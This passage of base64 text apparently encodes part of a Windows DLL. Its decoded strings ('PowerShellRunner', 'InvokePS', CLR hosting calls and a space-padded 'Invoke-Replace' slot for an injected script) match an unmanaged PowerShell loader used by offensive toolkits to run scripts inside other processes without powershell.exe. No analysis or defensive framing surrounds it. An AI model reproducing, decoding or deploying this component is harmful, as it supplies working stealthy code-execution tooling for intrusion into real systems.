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SQAgAEMAbwByAEIAaQBuAGQAVABvAFIAdQBuAHQAaQBtAGUAAAB3AGsAcwAAAEMAbwByAEIAaQBuAGQAVABvAFIAdQBuAHQAaQBtAGUAIABmAGEAaQBsAGUAZAAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAABtAHMAYwBvAHIAZQBlAC4AZABsAGwAAABQb3dlclNoZWxsUnVubmVyAAAAAFBvd2VyU2hlbGxSdW5uZXIuUG93ZXJTaGVsbFJ1bm5lcgAAAAAAAABGAGEAaQBsAGUAZAAgAHQAbwAgAGMAcgBlAGEAdABlACAAdABoAGUAIAByAHUAbgB0AGkAbQBlACAAaABvAHMAdAAKAAAAAABDAEwAUgAgAGYAYQBpAGwAZQBkACAAdABvACAAcwB0AGEAcgB0ACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAABSAHUAbgB0AGkAbQBlAEMAbAByAEgAbwBzAHQAOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAQQBwAHAARABvAG0AYQBpAG4ASQBkACAAZgBhAGkAbABlAGQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAABJAEMAbwByAFIAdQBuAHQAaQBtAGUASABvAHMAdAA6ADoARwBlAHQARABlAGYAYQB1AGwAdABEAG8AbQBhAGkAbgAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAARgBhAGkAbABlAGQAIAB0AG8AIABnAGUAdAAgAGQAZQBmAGEAdQBsAHQAIABBAHAAcABEAG8AbQBhAGkAbgAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAAAARgBhAGkAbABlAGQAIAB0AG8AIABsAG8AYQBkACAAdABoAGUAIABhAHMAcwBlAG0AYgBsAHkAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAAAAAEYAYQBpAGwAZQBkACAAdABvACAAZwBlAHQAIAB0AGgAZQAgAFQAeQBwAGUAIABpAG4AdABlAHIAZgBhAGMAZQAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAEkAbgB2AG8AawBlAC0AUgBlAHAAbABhAGMAZQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAAAAAAEkAbgB2AG8AawBlAFAAUwAAAAAAUwBhAGYAZQBBAHIAcgBhAHkAUAB1AHQARQBsAGUAbQBlAG4AdAAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAAAAAEYAYQBpAGwAZQBkACAAdABvACAAaQBuAHYAbwBrAGUAIABJAG4AdgBvAGsAZQBQAFMAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAjEIBEIYbABCVKwAQYmFkIGFsbG9jYXRpb24AAAAAAADYQgEQFisAEJUrABBVbmtub3duIGV4Y2VwdGlvbgAAAGNzbeABAAAAAAAAAAAAAAADAAAAIAWTGQAAAAAAAAAA7EIBEGQsABC4qQEQCKoBEFxHABA0QwEQDUgAEJUrABBiYWQgZXhjZXB0aW9uAAAABQAAwAsAAAAAAAAAHQAAwAQAAAAAAAAAlgAAwAQAAAAAAAAAjQAAwAgAAAAAAAAAjgAAwAgAAAAAAAAAjwAAwAgAAAAAAAAAkAAAwAgAAAAAAAAAkQAAwAgAAAAAAAAAkgAAwAgAAAAAAAAAkwAAwAgAAAAAAAAAtAIAwAgAAAAAAAAAtQIAwAgAAAAAAAAADAAAAJAAAAADAAAACQAAAENvckV4aXRQcm9jZXNzAABrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAAAAAARmxzQWxsb2MAAAAARmxzRnJlZQBGbHNHZXRWYWx1ZQBGbHNTZXRWYWx1ZQBJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uRXgAQ3JlYXRlRXZlbnRFeFcAAENyZWF0ZVNlbWFwaG9yZUV4VwAAU2V0VGhyZWFkU3RhY2tHdWFyYW50ZWUAQ3JlYXRlVGhyZWFkcG9vbFRpbWVyAAAAU2V0VGhyZWFkcG9vbFRpbWVyAABXYWl0Rm9yVGhyZWFkcG9vbFRpbWVyQ2FsbGJhY2tzAENsb3NlVGhyZWFkcG9vbFRpbWVyAAAAAENyZWF0ZVRocmVhZHBvb2xXYWl0AAAAAFNldFRocmVhZHBvb2xXYWl0AAAAQ2xvc2VUaHJlYWRwb29sV2FpdABGbHVzaFByb2Nlc3NXcml0ZUJ1ZmZlcnMAAAAARnJlZUxpYnJhcnlXaGVuQ2FsbGJhY2tSZXR1cm5zAABHZXRDdXJyZW50UHJvY2Vzc29yTnVtYmVyAAAAR2V0TG9naWNhbFByb2Nlc3NvckluZm9ybWF0aW9uAABDcmVhdGVTeW1ib2xpY0xpbmtXAFNldERlZmF1bHREbGxEaXJlY3RvcmllcwAAAABFbnVtU3lzdGVtTG9jYWxlc0V4AENvbXBhcmVTdHJpbmdFeABHZXREYXRlRm9ybWF0RXgAR2V0TG9jYWxlSW5mb0V4AEdldFRpbWVGb3JtYXRFeABHZXRVc2VyRGVmYXVsdExvY2FsZU5hbWUAAAAASXNWYWxpZExvY2FsZU5hbWUAAABMQ01hcFN0cmluZ0V4AAAAR2V0Q3VycmVudFBhY2thZ2VJZABHZXRUaWNrQ291bnQ2NAAAR2V0RmlsZUluZm9ybWF0aW9uQnlIYW5kbGVFeFcAAABTZXRGaWxlSW5mb3JtYXRpb25CeUhhbmRsZVcAAgAAAOACARAIAAAAQAMBEAkAAACYAwEQCgAAAPADARAQAAAAOAQBEBEAAACQBAEQEgAAAPAEARATAAAAOAUBEBgAAACQBQEQGQAAAAAGARAaAAAAUAYBEBsAAADABgEQHAAAADAHARAeAAAAfAcBEB8AAADABwEQIAAAAIgIARAhAAAA8AgBECIAAADgCgEQeAAAAEgLARB5AAAAaAsBEHoAAACECwEQ/AAAAKALARD/AAAAqAsBEFIANgAwADAAMgANAAoALQAgAGYAbABvAGEAdABpAG4AZwAgAHAAbwBpAG4AdAAgAHMAdQBwAHAAbwByAHQAIABuAG8AdAAgAGwAbwBhAGQAZQBkAA0ACgAAAAAAAAAAAFIANgAwADAAOAANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGEAcgBnAHUAbQBlAG4AdABzAA0ACgAAAAAAAABSADYAMAAwADkADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABlAG4AdgBpAHIAbwBuAG0AZQBuAHQADQAKAAAAUgA2ADAAMQAwAA0ACgAtACAAYQBiAG8AcgB0ACgAKQAgAGgAYQBzACAAYgBlAGUAbgAgAGMAYQBsAGwAZQBkAA0ACgAAAAAAUgA2ADAAMQA2AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAdABoAHIAZQBhAGQAIABkAGEAdABhAA0ACgAAAFIANgAwADEANwANAAoALQAgAHUAbgBlAHgAcABlAGMAdABlAGQAIABtAHUAbAB0AGkAdABoAHIAZQBhAGQAIABsAG8AYwBrACAAZQByAHIAbwByAA0ACgAAAAAAAAAAAFIANgAwADEAOAANAAoALQAgAHUAbgBlAHgAcABlAGMAdABlAGQAIABoAGUAYQBwACAAZQByAHIAbwByAA0ACgAAAAAAAAAAAFIANgAwADEAOQANAAoALQAgAHUAbgBhAGIAbABlACAAdABvACAAbwBwAGUAbgAgAGMAbwBuAHMAbwBsAGUAIABkAGUAdgBpAGMAZQANAAoAAAAAAAAAAABSADYAMAAyADQADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABfAG8AbgBlAHgAaQB0AC8AYQB0AGUAeABpAHQAIAB0AGEAYgBsAGUADQAKAAAAAAAAAAAAUgA2ADAAMgA1AA0ACgAtACAAcAB1AHIAZQAgAHYAaQByAHQAdQBhAGwAIABmAHUAbgBjAHQAaQBvAG4AIABjAGEAbABsAA0ACgAAAAAAAABSADYAMAAyADYADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABzAHQAZABpAG8AIABpAG4AaQB0AGkAYQBsAGkAegBhAHQAaQBvAG4ADQAKAAAAAAAAAAAAUgA2ADAAMgA3AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAbABvAHcAaQBvACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAA0ACgAAAAAAAAAAAFIANgAwADIAOAANAAoALQAgAHUAbgBhAGIAbABlACAAdABvACAAaQBuAGkAdABpAGEAbABpAHoAZQAgAGgAZQBhAHAADQAKAAAAAABSADYAMAAzADAADQAKAC0AIABDAFIAVAAgAG4AbwB0ACAAaQBuAGkAdABpAGEAbABpAHoAZQBkAA0ACgAAAAAAAAAAAFIANgAwADMAMQANAAoALQAgAEEAdAB0AGUAbQBwAHQAIAB0AG8AIABpAG4AaQB0AGkAYQBsAGkAegBlACAAdABoAGUAIABDAFIAVAAgAG0AbwByAGUAIAB0AGgAYQBuACAAbwBuAGMAZQAuAAoAVABoAGkAcwAgAGkAbgBkAGkAYwBhAHQAZQBzACAAYQAgAGIAdQBnACAAaQBuACAAeQBvAHUAcgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAuAA0ACgAAAAAAUgA2ADAAMwAyAA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAbABvAGMAYQBsAGUAIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4ADQAKAAAAAABSADYAMAAzADMADQAKAC0AIABBAHQAdABlAG0AcAB0ACAAdABvACAAdQBzAGUAIABNAFMASQBMACAAYwBvAGQAZQAgAGYAcgBvAG0AIAB0AGgAaQBzACAAYQBzAHMAZQBtAGIAbAB5ACAAZAB1AHIAaQBuAGcAIABuAGEAdABpAHYAZQAgAGMAbwBkAGUAIABpAG4AaQB0AGkAYQBsAGkAegBhAHQAaQBvAG4ACgBUAGgAaQBzACAAaQBuAGQAaQBjAGEAdABlAHMAIABhACAAYgB1AGcAIABpAG4AIAB5AG8AdQByACAAYQBwAHAAbABpAGMAYQB0AGkAbwBuAC4AIABJAHQAIABpAHMAIABtAG8AcwB0ACAAbABpAGsAZQBsAHkAIAB0AGgAZQAgAHIAZQBzAHUAbAB0ACAAbwBmACAAYwBhAGwAbABpAG4AZwAgAGEAbgAgAE0AUwBJAEwALQBjAG8AbQBwAGkAbABlAGQAIAAoAC8AYwBsAHIAKQAgAGYAdQBuAGMAdABpAG8AbgAgAGYAcgBvAG0AIABhACAAbgBhAHQAaQB2AGUAIABjAG8AbgBzAHQAcgB1AGMAdABvAHIAIABvAHIAIABmAHIAbwBtACAARABsAGwATQBhAGkAbgAuAA0ACgAAAAAAUgA2ADAAMwA0AA0ACgAtACAAaQBuAGMAbwBuAHMAaQBzAHQAZQBuAHQAIABvAG4AZQB4AGkAdAAgAGIAZQBnAGkAbgAtAGUAbgBkACAAdgBhAHIAaQBhAGIAbABlAHMADQAKAAAAAABEAE8ATQBBAEkATgAgAGUAcgByAG8AcgANAAoAAAAAAFMASQBOAEcAIABlAHIAcgBvAHIADQAKAAAAAABUAEwATwBTAFMAIABlAHIAcgBvAHIADQAKAAAADQAKAAAAAAByAHUAbgB0AGkAbQBlACAAZQByAHIAbwByACAAAAAAAFIAdQBuAHQAaQBtAGUAIABFAHIAcgBvAHIAIQAKAAoAUAByAG8AZwByAGEAbQA6ACAAAAA8AHAAcgBvAGcAcgBhAG0AIABuAGEAbQBlACAAdQBuAGsAbgBvAHcAbgA+AAAAAAAuAC4ALgAAAAoACgAAAAAAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAAVgBpAHMAdQBhAGwAIABDACsAKwAgAFIAdQBuAHQAaQBtAGUAIABMAGkAYgByAGEAcgB5AAAAAACcDAEQqAwBELQMARDADAEQagBhAC0ASgBQAAAAegBoAC0AQwBOAAAAawBvAC0ASwBSAAAAegBoAC0AVABXAAAAU3VuAE1vbgBUdWUAV2VkAFRodQBGcmkAU2F0AFN1bmRheQAATW9uZGF5AABUdWVzZGF5AFdlZG5lc2RheQAAAFRo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AABgbG9jYWwgc3RhdGljIGd1YXJkJwAAAABgc3RyaW5nJwAAAABgdmJhc2UgZGVzdHJ1Y3RvcicAAGB2ZWN0b3IgZGVsZXRpbmcgZGVzdHJ1Y3RvcicAAAAAYGRlZmF1bHQgY29uc3RydWN0b3IgY2xvc3VyZScAAABgc2NhbGFyIGRlbGV0aW5nIGRlc3RydWN0b3InAAAAAGB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwBgdmlydHVhbCBkaXNwbGFjZW1lbnQgbWFwJwAAYGVoIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAYGVoIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwBgZWggdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYGNvcHkgY29uc3RydWN0b3IgY2xvc3VyZScAAGB1ZHQgcmV0dXJuaW5nJwBgRUgAYFJUVEkAAABgbG9jYWwgdmZ0YWJsZScAYGxvY2FsIHZmdGFibGUgY29uc3RydWN0b3IgY2xvc3VyZScAIG5ld1tdAAAgZGVsZXRlW10AAABgb21uaSBjYWxsc2lnJwAAYHBsYWNlbWVudCBkZWxldGUgY2xvc3VyZScAAGBwbGFjZW1lbnQgZGVsZXRlW10gY2xvc3VyZScAAAAAYG1hbmFnZWQgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBtYW5hZ2VkIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgZWggdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYGVoIHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwBgZHluYW1pYyBpbml0aWFsaXplciBmb3IgJwAAYGR5bmFtaWMgYXRleGl0IGRlc3RydWN0b3IgZm9yICcAAAAAYHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgbWFuYWdlZCB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAGBsb2NhbCBzdGF0aWMgdGhyZWFkIGd1YXJkJwAgVHlwZSBEZXNjcmlwdG9yJwAAACBCYXNlIENsYXNzIERlc2NyaXB0b3IgYXQgKAAgQmFzZSBDbGFzcyBBcnJheScAACBDbGFzcyBIaWVyYXJjaHkgRGVzY3JpcHRvcicAAAAAIENvbXBsZXRlIE9iamVjdCBMb2NhdG9yJwAAAAAAAAAGgICGgIGAAAAQA4aAhoKAFAUFRUVFhYWFBQAAMDCAUICIAAgAKCc4UFeAAAcANzAwUFCIAAAAICiAiICAAAAAYGhgaGhoCAgHeHBwd3BwCAgAAAgACAAHCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAgACAAIAAgACAAIAAgACAAKAAoACgAKAAoACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEgAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAhACEAIQAhACEAIQAhACEAIQAhAAQABAAEAAQABAAEAAQAIEAgQCBAIEAgQCBAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAQABAAEAAQABAAEACCAIIAggCCAIIAggACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAEAAQABAAEAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAIAAgACAAIAAgACAAIAAgACgAKAAoACgAKAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABIABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAIQAhACEAIQAh